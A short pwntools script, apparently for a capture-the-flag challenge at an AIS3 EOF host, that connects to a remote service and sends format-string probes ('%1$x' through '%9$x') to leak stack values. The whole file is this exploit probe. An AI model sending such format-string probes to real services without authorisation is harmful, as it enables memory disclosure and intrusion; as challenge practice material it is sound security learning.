from pwn import *

context.log_level = 'debug'

r = remote('eof.ais3.org', 6666)

for i in range(1, 10):
    r.send("%{}$x\n".format(i))
    r.recvline()
